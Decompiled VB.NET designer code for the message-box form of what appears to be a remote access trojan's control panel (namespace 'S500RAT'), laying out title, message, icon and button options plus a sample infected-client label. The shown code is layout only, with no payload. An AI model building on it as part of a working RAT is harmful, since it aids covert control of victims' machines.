Namespace S500RAT
	' Token: 0x02000024 RID: 36
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormMessageBox
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000623 RID: 1571 RVA: 0x00034750 File Offset: 0x00032950
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000624 RID: 1572 RVA: 0x000347A0 File Offset: 0x000329A0
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormMessageBox))
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.UiLabel1 = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.Guna2ResizeBox1 = New Global.Guna.UI2.WinForms.Guna2ResizeBox()
			Me.title = New Global.Guna.UI2.WinForms.Guna2TextBox()
			Me.Panel3 = New Global.System.Windows.Forms.Panel()
			Me.MsgError = New Global.Sunny.UI.UIRadioButton()
			Me.MsgWarning = New Global.Sunny.UI.UIRadioButton()
			Me.MsgQuestion = New Global.Sunny.UI.UIRadioButton()
			Me.MsgInformation = New Global.Sunny.UI.UIRadioButton()
			Me.PictureBox5 = New Global.System.Windows.Forms.PictureBox()
			Me.PictureBox2 = New Global.System.Windows.Forms.PictureBox()
			Me.PictureBox6 = New Global.System.Windows.Forms.PictureBox()
			Me.PictureBox4 = New Global.System.Windows.Forms.PictureBox()
			Me.YesNo = New Global.Sunny.UI.UIRadioButton()
			Me.YesNoCancel = New Global.Sunny.UI.UIRadioButton()
			Me.OK = New Global.Sunny.UI.UIRadioButton()
			Me.OkCancel = New Global.Sunny.UI.UIRadioButton()
			Me.RetryCancel = New Global.Sunny.UI.UIRadioButton()
			Me.AbortRetryIgnore = New Global.Sunny.UI.UIRadioButton()
			Me.Test = New Global.Guna.UI2.WinForms.Guna2GradientButton()
			Me.SendMessage = New Global.Guna.UI2.WinForms.Guna2GradientButton()
			Me.Message = New Global.Sunny.UI.UIRichTextBox()
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.MAX = New Global.S500RAT.ValleyMax()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Panel3.SuspendLayout()
			CType(Me.PictureBox5, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox2, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox6, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			MyBase.SuspendLayout()
			Me.Timer1.Interval = 2000
			Me.UiLabel1.AutoSize = True
			Me.UiLabel1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UiLabel1.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.UiLabel1.ForeColor = Global.System.Drawing.Color.White
			Me.UiLabel1.Location = New Global.System.Drawing.Point(25, 12)
			Me.UiLabel1.Name = "UiLabel1"
			Me.UiLabel1.Size = New Global.System.Drawing.Size(97, 19)
			Me.UiLabel1.Style = Global.Sunny.UI.UIStyle.Custom
			Me.UiLabel1.TabIndex = 344
			Me.UiLabel1.Text = "Message Box"
			Me.UiLabel1.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(26, 38)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(200, 16)
			Me.ClientInfo.TabIndex = 345
			Me.ClientInfo.Text = "FC / Desktop_3424 / Windows 10 pro"
			Me.Guna2ResizeBox1.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Guna2ResizeBox1.BackColor = Global.System.Drawing.Color.Transparent
			Me.Guna2ResizeBox1.FillColor = Global.System.Drawing.Color.Silver
			Me.Guna2ResizeBox1.ForeColor = Global.System.Drawing.Color.Empty
			Me.Guna2ResizeBox1.Location = New Global.System.Drawing.Point(535, 440)
			Me.Guna2ResizeBox1.Name = "Guna2ResizeBox1"
			Me.Guna2ResizeBox1.Size = New Global.System.Drawing.Size(20, 20)
			Me.Guna2ResizeBox1.TabIndex = 524
			Me.Guna2ResizeBox1.TargetControl = Me
			Me.Guna2ResizeBox1.UseTransparentBackground = True
			Me.title.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.title.Animated = True
			Me.title.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			Me.title.BorderColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.title.BorderRadius = 6
			Me.title.BorderStyle = Global.System.Drawing.Drawing2D.DashStyle.Custom
			Me.title.Cursor = Global.System.Windows.Forms.Cursors.IBeam
			Me.title.DefaultText = ""
			Me.title.DisabledState.BorderColor = Global.System.Drawing.Color.FromArgb(208, 208, 208)
			Me.title.DisabledState.FillColor = Global.System.Drawing.Color.FromArgb(226, 226, 226)
			Me.title.DisabledState.ForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.title.DisabledState.Parent = Me.title
			Me.title.DisabledState.PlaceholderForeColor = Global.System.Drawing.Color.FromArgb(138, 138, 138)
			Me.title.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.title.FocusedState.BorderColor = Global.System.Drawing.Color.FromArgb(82, 43, 255)
			Me.title.FocusedState.Parent = Me.title
			Me.title.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.title.ForeColor = Global.System.Drawing.Color.White
			Me.title.HoverState.BorderColor = Global.System.Drawing.Color.Magenta
			Me.title.HoverState.Parent = Me.title
			Me.title.IconRightCursor = Global.System.Windows.Forms.Cursors.Hand
			Me.title.Location = New Global.System.Drawing.Point(13, 91)
			Me.title.Margin = New Global.System.Windows.Forms.Padding(3, 2, 3, 2)
			Me.title.Name = "title"
			Me.title.PasswordChar = vbNullChar
			Me.title.PlaceholderForeColor = Global.System.Drawing.Color.Gray
			Me.title.PlaceholderText = "Title"
			Me.title.SelectedText = ""
			Me.title.ShadowDecoration.Parent = Me.title
			Me.title.Size = New Global.System.Drawing.Size(516, 28)
			Me.title.TabIndex = 526
			Me.title.TextAlign = Global.System.Windows.Forms.HorizontalAlignment.Center
			Me.Panel3.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Panel3.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 48)
			Me.Panel3.Controls.Add(Me.MsgError)
			Me.Panel3.Controls.Add(Me.MsgWarning)
			Me.Panel3.Controls.Add(Me.MsgQuestion)
			Me.Panel3.Controls.Add(Me.MsgInformation)
			Me.Panel3.Controls.Add(Me.PictureBox5)
			Me.Panel3.Controls.Add(Me.PictureBox2)
			Me.Panel3.Controls.Add(Me.PictureBox6)
			Me.Panel3.Controls.Add(Me.PictureBox4)
			Me.Panel3.Location = New Global.System.Drawing.Point(337, 135)
			Me.Panel3.Name = "Panel3"
			Me.Panel3.Size = New Global.System.Drawing.Size(192, 70)
			Me.Panel3.TabIndex = 528
			Me.MsgError.BackColor = Global.System.Drawing.Color.Transparent
			Me.MsgError.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MsgError.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.MsgError.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.MsgError.Location = New Global.System.Drawing.Point(153, 43)
			Me.MsgError.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.MsgError.Name = "MsgError"
			Me.MsgError.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.MsgError.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.MsgError.Size = New Global.System.Drawing.Size(19, 18)
			Me.MsgError.Style = Global.Sunny.UI.UIStyle.Custom
			Me.MsgError.TabIndex = 535
			Me.MsgWarning.BackColor = Global.System.Drawing.Color.Transparent
			Me.MsgWarning.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MsgWarning.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.MsgWarning.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.MsgWarning.Location = New Global.System.Drawing.Point(109, 43)
			Me.MsgWarning.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.MsgWarning.Name = "MsgWarning"
			Me.MsgWarning.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.MsgWarning.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.MsgWarning.Size = New Global.System.Drawing.Size(19, 18)
			Me.MsgWarning.Style = Global.Sunny.UI.UIStyle.Custom
			Me.MsgWarning.TabIndex = 534
			Me.MsgQuestion.BackColor = Global.System.Drawing.Color.Transparent
			Me.MsgQuestion.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MsgQuestion.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.MsgQuestion.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.MsgQuestion.Location = New Global.System.Drawing.Point(61, 43)
			Me.MsgQuestion.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.MsgQuestion.Name = "MsgQuestion"
			Me.MsgQuestion.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.MsgQuestion.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.MsgQuestion.Size = New Global.System.Drawing.Size(19, 18)
			Me.MsgQuestion.Style = Global.Sunny.UI.UIStyle.Custom
			Me.MsgQuestion.TabIndex = 533
			Me.MsgInformation.BackColor = Global.System.Drawing.Color.Transparent
			Me.MsgInformation.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MsgInformation.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.MsgInformation.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.MsgInformation.Location = New Global.System.Drawing.Point(12, 43)
			Me.MsgInformation.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.MsgInformation.Name = "MsgInformation"
			Me.MsgInformation.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.MsgInformation.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.MsgInformation.Size = New Global.System.Drawing.Size(19, 18)
			Me.MsgInformation.Style = Global.Sunny.UI.UIStyle.Custom
			Me.MsgInformation.TabIndex = 532
			Me.PictureBox5.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.PictureBox5.Image = CType(componentResourceManager.GetObject("PictureBox5.Image"), Global.System.Drawing.Image)
			Me.PictureBox5.Location = New Global.System.Drawing.Point(55, 3)
			Me.PictureBox5.Name = "PictureBox5"
			Me.PictureBox5.Size = New Global.System.Drawing.Size(33, 34)
			Me.PictureBox5.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox5.TabIndex = 8
			Me.PictureBox5.TabStop = False
			Me.PictureBox2.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.PictureBox2.Image = CType(componentResourceManager.GetObject("PictureBox2.Image"), Global.System.Drawing.Image)
			Me.PictureBox2.Location = New Global.System.Drawing.Point(104, 3)
			Me.PictureBox2.Name = "PictureBox2"
			Me.PictureBox2.Size = New Global.System.Drawing.Size(29, 34)
			Me.PictureBox2.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox2.TabIndex = 9
			Me.PictureBox2.TabStop = False
			Me.PictureBox6.BackColor = Global.System.Drawing.Color.Transparent
			Me.PictureBox6.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.PictureBox6.Image = CType(componentResourceManager.GetObject("PictureBox6.Image"), Global.System.Drawing.Image)
			Me.PictureBox6.Location = New Global.System.Drawing.Point(8, 3)
			Me.PictureBox6.Name = "PictureBox6"
			Me.PictureBox6.Size = New Global.System.Drawing.Size(29, 34)
			Me.PictureBox6.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox6.TabIndex = 7
			Me.PictureBox6.TabStop = False
			Me.PictureBox4.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.PictureBox4.Image = CType(componentResourceManager.GetObject("PictureBox4.Image"), Global.System.Drawing.Image)
			Me.PictureBox4.Location = New Global.System.Drawing.Point(148, 3)
			Me.PictureBox4.Name = "PictureBox4"
			Me.PictureBox4.Size = New Global.System.Drawing.Size(29, 34)
			Me.PictureBox4.SizeMode = Global.System.Windows.Forms.PictureBoxSizeMode.Zoom
			Me.PictureBox4.TabIndex = 10
			Me.PictureBox4.TabStop = False
			Me.YesNo.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.YesNo.BackColor = Global.System.Drawing.Color.Transparent
			Me.YesNo.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.YesNo.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.YesNo.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.YesNo.Location = New Global.System.Drawing.Point(347, 265)
			Me.YesNo.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.YesNo.Name = "YesNo"
			Me.YesNo.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.YesNo.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.YesNo.Size = New Global.System.Drawing.Size(80, 18)
			Me.YesNo.Style = Global.Sunny.UI.UIStyle.Custom
			Me.YesNo.TabIndex = 529
			Me.YesNo.Text = "Yes | No"
			Me.YesNoCancel.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.YesNoCancel.BackColor = Global.System.Drawing.Color.Transparent
			Me.YesNoCancel.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.YesNoCancel.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.YesNoCancel.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.YesNoCancel.Location = New Global.System.Drawing.Point(347, 289)
			Me.YesNoCancel.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.YesNoCancel.Name = "YesNoCancel"
			Me.YesNoCancel.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.YesNoCancel.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.YesNoCancel.Size = New Global.System.Drawing.Size(119, 19)
			Me.YesNoCancel.Style = Global.Sunny.UI.UIStyle.Custom
			Me.YesNoCancel.TabIndex = 530
			Me.YesNoCancel.Text = "Yes | No | Cancel"
			Me.OK.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.OK.BackColor = Global.System.Drawing.Color.Transparent
			Me.OK.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.OK.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.OK.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.OK.Location = New Global.System.Drawing.Point(347, 216)
			Me.OK.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.OK.Name = "OK"
			Me.OK.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.OK.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.OK.Size = New Global.System.Drawing.Size(120, 19)
			Me.OK.Style = Global.Sunny.UI.UIStyle.Custom
			Me.OK.TabIndex = 531
			Me.OK.Text = "OK"
			Me.OkCancel.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.OkCancel.BackColor = Global.System.Drawing.Color.Transparent
			Me.OkCancel.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.OkCancel.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.OkCancel.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.OkCancel.Location = New Global.System.Drawing.Point(347, 240)
			Me.OkCancel.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.OkCancel.Name = "OkCancel"
			Me.OkCancel.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.OkCancel.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.OkCancel.Size = New Global.System.Drawing.Size(120, 19)
			Me.OkCancel.Style = Global.Sunny.UI.UIStyle.Custom
			Me.OkCancel.TabIndex = 532
			Me.OkCancel.Text = "OK | Cancel"
			Me.RetryCancel.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.RetryCancel.BackColor = Global.System.Drawing.Color.Transparent
			Me.RetryCancel.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.RetryCancel.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.RetryCancel.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.RetryCancel.Location = New Global.System.Drawing.Point(347, 314)
			Me.RetryCancel.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.RetryCancel.Name = "RetryCancel"
			Me.RetryCancel.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.RetryCancel.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.RetryCancel.Size = New Global.System.Drawing.Size(120, 19)
			Me.RetryCancel.Style = Global.Sunny.UI.UIStyle.Custom
			Me.RetryCancel.TabIndex = 533
			Me.RetryCancel.Text = "Retry | Cancel"
			Me.AbortRetryIgnore.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.AbortRetryIgnore.BackColor = Global.System.Drawing.Color.Transparent
			Me.AbortRetryIgnore.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.AbortRetryIgnore.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.AbortRetryIgnore.ForeColor = Global.System.Drawing.Color.FromArgb(143, 156, 176)
			Me.AbortRetryIgnore.Location = New Global.System.Drawing.Point(347, 339)
			Me.AbortRetryIgnore.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.AbortRetryIgnore.Name = "AbortRetryIgnore"
			Me.AbortRetryIgnore.Padding = New Global.System.Windows.Forms.Padding(22, 0, 0, 0)
			Me.AbortRetryIgnore.RadioButtonColor = Global.System.Drawing.Color.FromArgb(84, 43, 244)
			Me.AbortRetryIgnore.Size = New Global.System.Drawing.Size(162, 19)
			Me.AbortRetryIgnore.Style = Global.Sunny.UI.UIStyle.Custom
			Me.AbortRetryIgnore.TabIndex = 534
			Me.AbortRetryIgnore.Text = "About | Retry | Ignore"
			Me.Test.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Test.BackColor = Global.System.Drawing.Color.Transparent
			Me.Test.BorderRadius = 8
			Me.Test.CheckedState.Parent = Me.Test
			Me.Test.CustomImages.Parent = Me.Test
			Me.Test.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Test.FillColor2 = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Test.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Test.ForeColor = Global.System.Drawing.Color.White
			Me.Test.HoverState.Parent = Me.Test
			Me.Test.Location = New Global.System.Drawing.Point(337, 375)
			Me.Test.Name = "Test"
			Me.Test.ShadowDecoration.Parent = Me.Test
			Me.Test.Size = New Global.System.Drawing.Size(192, 34)
			Me.Test.TabIndex = 535
			Me.Test.Text = "Test"
			Me.SendMessage.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.SendMessage.BackColor = Global.System.Drawing.Color.Transparent
			Me.SendMessage.BorderRadius = 8
			Me.SendMessage.CheckedState.Parent = Me.SendMessage
			Me.SendMessage.CustomImages.Parent = Me.SendMessage
			Me.SendMessage.Enabled = False
			Me.SendMessage.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.SendMessage.FillColor2 = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.SendMessage.Font = New Global.System.Drawing.Font("Nirmala UI", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.SendMessage.ForeColor = Global.System.Drawing.Color.White
			Me.SendMessage.HoverState.Parent = Me.SendMessage
			Me.SendMessage.Location = New Global.System.Drawing.Point(337, 415)
			Me.SendMessage.Name = "SendMessage"
			Me.SendMessage.ShadowDecoration.Parent = Me.SendMessage
			Me.SendMessage.Size = New Global.System.Drawing.Size(192, 43)
			Me.SendMessage.TabIndex = 536
			Me.SendMessage.Text = "Send"
			Me.Message.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Message.AutoWordSelection = True
			Me.Message.BackColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Message.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Message.FillColor2 = Global.System.Drawing.SystemColors.WindowFrame
			Me.Message.FillDisableColor = Global.System.Drawing.Color.Red
			Me.Message.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.Message.ForeColor = Global.System.Drawing.Color.White
			Me.Message.ForeDisableColor = Global.System.Drawing.Color.Blue
			Me.Message.Location = New Global.System.Drawing.Point(13, 126)
			Me.Message.Margin = New Global.System.Windows.Forms.Padding(4, 5, 4, 5)
			Me.Message.MinimumSize = New Global.System.Drawing.Size(1, 1)
			Me.Message.Name = "Message"
			Me.Message.Padding = New Global.System.Windows.Forms.Padding(2)
			Me.Message.Radius = 8
			Me.Message.RectColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.Message.Size = New Global.System.Drawing.Size(317, 332)
			Me.Message.Style = Global.Sunny.UI.UIStyle.Custom
			Me.Message.TabIndex = 537
			Me.Message.TextAlignment = Global.System.Drawing.ContentAlignment.TopCenter
			Me.Message.WordWrap = True
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(477, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 560
			Me.Mini.Text = "ValleyMini1"
			Me.MAX.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.MAX.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.MAX.Location = New Global.System.Drawing.Point(503, 12)
			Me.MAX.Name = "MAX"
			Me.MAX.Size = New Global.System.Drawing.Size(20, 20)
			Me.MAX.TabIndex = 559
			Me.MAX.Text = "ValleyMax1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(529, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 558
			Me.ExitForm.Text = "ValleyClose1"
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 40
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(566, 472)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.MAX)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.Message)
			MyBase.Controls.Add(Me.SendMessage)
			MyBase.Controls.Add(Me.Test)
			MyBase.Controls.Add(Me.AbortRetryIgnore)
			MyBase.Controls.Add(Me.Panel3)
			MyBase.Controls.Add(Me.RetryCancel)
			MyBase.Controls.Add(Me.title)
			MyBase.Controls.Add(Me.YesNo)
			MyBase.Controls.Add(Me.OkCancel)
			MyBase.Controls.Add(Me.Guna2ResizeBox1)
			MyBase.Controls.Add(Me.YesNoCancel)
			MyBase.Controls.Add(Me.OK)
			MyBase.Controls.Add(Me.UiLabel1)
			MyBase.Controls.Add(Me.ClientInfo)
			Me.DoubleBuffered = True
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormMessageBox"
			Me.Text = "FormMessageBox"
			MyBase.TopMost = True
			Me.Panel3.ResumeLayout(False)
			CType(Me.PictureBox5, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox2, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox6, Global.System.ComponentModel.ISupportInitialize).EndInit()
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).EndInit()
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x040002C8 RID: 712
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
